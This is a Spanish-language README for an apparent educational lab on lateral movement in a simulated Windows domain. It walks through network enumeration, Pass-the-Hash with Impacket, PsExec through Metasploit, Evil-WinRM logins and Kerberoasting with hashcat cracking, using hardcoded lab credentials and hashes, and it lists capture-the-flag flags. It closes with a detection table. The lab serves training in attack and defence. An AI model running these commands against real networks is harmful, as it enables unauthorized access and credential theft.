# ↔️ Lab 04: Movimiento Lateral

## Objetivo

Practicar técnicas de movimiento lateral en una red de Windows/Linux.

## Escenario

Eres un atacante con acceso a una máquina (`attacker`). Tu objetivo es moverte lateralmente a otras máquinas en la red usando credenciales comprometidas.

## Topología de Red

```
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│    ATTACKER     │────▶│   DC (Domain    │────▶│   FILE SERVER   │
│  172.22.0.10    │     │   Controller)   │     │  172.22.0.30    │
│                 │     │  172.22.0.20    │     │                 │
└─────────────────┘     └─────────────────┘     └─────────────────┘
```

## Máquinas

| Máquina | IP | SO | Rol | Credenciales |
|---------|-----|-----|-----|--------------|
| Attacker | 172.22.0.10 | Kali | Atacante | root/toor |
| DC | 172.22.0.20 | Windows Server 2019 | Domain Controller | Admin / P@ssw0rd123 |
| FileServer | 172.22.0.30 | Windows Server 2019 | File Server | user1 / User123 |

## Técnicas Implementadas

| # | Técnica | Herramienta | Dificultad |
|---|---------|-------------|------------|
| 1 | Pass-the-Hash | Impacket | ⭐⭐ |
| 2 | PsExec | Impacket/Metasploit | ⭐ |
| 3 | WinRM | Evil-WinRM | ⭐⭐ |
| 4 | SMB Exec | CrackMapExec | ⭐⭐ |
| 5 | Kerberoasting | Impacket | ⭐⭐⭐ |

## Inicio Rápido

```bash
# Levantar el entorno completo
docker compose up -d

# Verificar que todas las máquinas están activas
docker compose ps
```

## Instrucciones

### Paso 1: Enumeración de Red

```bash
# Desde el atacante
nmap -sn 172.22.0.0/24

# Enumerar servicios
nmap -sV -sC 172.22.0.20 172.22.0.30

# Buscar recursos SMB
smbclient -L //172.22.0.20 -U admin
smbclient -L //172.22.0.30 -U user1
```

### Paso 2: Pass-the-Hash con Impacket

```bash
# Crear archivo de hashes
echo 'admin:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::' > hashes.txt

# Ejecutar Pass-the-Hash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 admin@172.22.0.20
```

### Paso 3: PsExec

```bash
# Usando Impacket
psexec.py admin:P@ssw0rd123@172.22.0.20

# Usando Metasploit
msfconsole -q
use exploit/windows/smb/psexec
set RHOSTS 172.22.0.20
set SMBUser admin
set SMBPass P@ssw0rd123
exploit
```

### Paso 4: WinRM con Evil-WinRM

```bash
# Instalar Evil-WinRM
gem install evil-winrm

# Conectar
evil-winrm -i 172.22.0.20 -u admin -p P@ssw0rd123

# Con PowerShell
evil-winrm -i 172.22.0.20 -u admin -p P@ssw0rd123 -s /scripts/
```

### Paso 5: Kerberoasting

```bash
# Solicitar TGS para servicios
GetUserSPNs.py domain/user:password -dc-ip 172.22.0.20 -request

# Crackear hashes con hashcat
hashcat -m 13100 hashes.txt wordlist.txt
```

## Flags

| Máquina | Flag |
|---------|------|
| DC | FLAG{l4t3r4l_m0v3m3nt_dc} |
| FileServer | FLAG{l4t3r4l_m0v3m3nt_f1l3} |

## Criterios de Éxito

- [ ] Moverse desde Attacker a DC
- [ ] Moverse desde DC a FileServer
- [ ] Leer las flags de ambas máquinas
- [ ] Documentar cada técnica utilizada
- [ ] Identificar técnicas de detección

## Detección

| Técnica | Señal de Detección | Herramienta |
|---------|-------------------|-------------|
| Pass-the-Hash | Event ID 4624 (Type 3) | SIEM, Sysmon |
| PsExec | Service creation event | Windows Event Logs |
| WinRM | Event ID 4624 (Type 3) | Sysmon |
| Kerberoasting | TGS requests anomalos | SIEM |

## Limpieza

```bash
# Detener y eliminar el entorno
docker compose down -v --rmi all
```

---

*Lab creado para fines educativos — CyberDefense-Pro-Network*
